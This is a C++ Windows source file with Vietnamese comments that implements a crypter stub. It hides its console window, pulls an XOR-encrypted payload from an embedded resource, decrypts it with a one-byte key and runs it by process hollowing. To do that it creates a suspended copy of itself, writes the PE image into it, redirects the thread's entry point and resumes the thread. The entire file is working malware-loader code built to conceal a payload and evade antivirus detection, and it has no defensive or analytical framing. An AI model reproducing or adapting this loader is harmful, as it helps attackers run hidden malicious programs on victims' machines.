#include <iostream>
#include <windows.h>

//  HAM DE LAY RESOURCE TRA VE MANG MA HEX
unsigned char *GetResource(int resourceId, const char *resourceString, unsigned long *dwSize);
//  HAM GIAI MA PAYLOAD BANG XOR
char *DecryptResource(unsigned char *resourcePtr, unsigned long resourceSize, char key, unsigned long keySize);
//  PROCESS HOLLOWING
bool RunPEResource(char *decryptedPE, unsigned long peSize);

int main()
{
    // AN CUA SO CONSOLE
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // THUC HIEN LAY PAYLOAD MA HOA DUOC NHUNG TRONG FILE
    unsigned long dwSize;
    unsigned char *resourcePtr = GetResource(132, "BIN", &dwSize);

    // GIAI MA PAYLOAD
    char key = 'a'; //  KEY NAY GIONG VOI KEY TRONG CRYPTER
    unsigned long keySize = 1;
    char *decrypted = DecryptResource(resourcePtr, dwSize, key, keySize);

    bool runSuccess = RunPEResource(decrypted, dwSize);

    if (!runSuccess)
    {
        std::cout << "Something wrong!" << std::endl;
    }

    //  GIAI PHONG BO NHO
    delete[] decrypted;
    return 0;
}

//  HAM DE LAY RESOURCE TRA VE MANG MA HEX
unsigned char *GetResource(int resourceId, const char *resourceString, unsigned long *dwSize)
{
    HGLOBAL hResData;
    HRSRC hResInfo;
    unsigned char *pvRes;
    HMODULE hModule = GetModuleHandle(NULL);

    // Use resourceString directly in FindResource
    if (((hResInfo = FindResourceA(hModule, MAKEINTRESOURCEA(resourceId), resourceString)) != NULL) &&
        ((hResData = LoadResource(hModule, hResInfo)) != NULL) &&
        ((pvRes = (unsigned char *)LockResource(hResData)) != NULL))
    {
        *dwSize = SizeofResource(hModule, hResInfo);
        return pvRes;
    }

    // quit if no resource found
    *dwSize = 0;
    return nullptr;
}

//  HAM GIAI MA PAYLOAD BANG XOR
char *DecryptResource(unsigned char *resourcePtr, unsigned long resourceSize, char key, unsigned long keySize)
{
    // decrypt the resource raw data
    char *decrypted = new char[resourceSize];
    for (unsigned long i = 0; i < resourceSize; i++)
        decrypted[i] = resourcePtr[i] ^ key;

    return decrypted;
}

//  PROCESS HOLLOWING
bool RunPEResource(char *decryptedPE, unsigned long peSize)
{
    IMAGE_DOS_HEADER *DOSHeader;
    IMAGE_NT_HEADERS64 *NtHeader;
    IMAGE_SECTION_HEADER *SectionHeader;

    PROCESS_INFORMATION PI;
    STARTUPINFOA SI;

    void *pImageBase;

    char currentFilePath[MAX_PATH];

    DOSHeader = PIMAGE_DOS_HEADER(decryptedPE);
    NtHeader = PIMAGE_NT_HEADERS64(DWORD64(decryptedPE) + DOSHeader->e_lfanew);

    if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
    {
        ZeroMemory(&PI, sizeof(PI));
        ZeroMemory(&SI, sizeof(SI));

        GetModuleFileNameA(NULL, currentFilePath, MAX_PATH);
        // TAO MOT PROCESS MOI DE THUC HIEN INJECT
        if (CreateProcessA(currentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &SI, &PI))
        {

            CONTEXT *CTX;
            CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
            CTX->ContextFlags = CONTEXT_FULL;

            if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
            {
                pImageBase = VirtualAllocEx(
                    PI.hProcess,
                    LPVOID(NtHeader->OptionalHeader.ImageBase),
                    NtHeader->OptionalHeader.SizeOfImage,
                    MEM_COMMIT | MEM_RESERVE,
                    PAGE_EXECUTE_READWRITE);

                WriteProcessMemory(PI.hProcess, pImageBase, decryptedPE, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
                // THUC HIEN GHI CAC PE SECTIONS
                for (size_t i = 0; i < NtHeader->FileHeader.NumberOfSections; i++)
                {
                    SectionHeader = PIMAGE_SECTION_HEADER(DWORD64(decryptedPE) + DOSHeader->e_lfanew + 264 + (i * 40));

                    WriteProcessMemory(
                        PI.hProcess,
                        LPVOID(DWORD64(pImageBase) + SectionHeader->VirtualAddress),
                        LPVOID(DWORD64(decryptedPE) + SectionHeader->PointerToRawData),
                        SectionHeader->SizeOfRawData,
                        NULL);

                    WriteProcessMemory(
                        PI.hProcess,
                        LPVOID(CTX->Rdx + 0x10),
                        LPVOID(&NtHeader->OptionalHeader.ImageBase),
                        8,
                        NULL);
                }

                CTX->Rcx = DWORD64(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
                SetThreadContext(PI.hThread, LPCONTEXT(CTX));
                ResumeThread(PI.hThread);

                WaitForSingleObject(PI.hProcess, INFINITE);

                return true;
            }
        }
    }
    return false;
}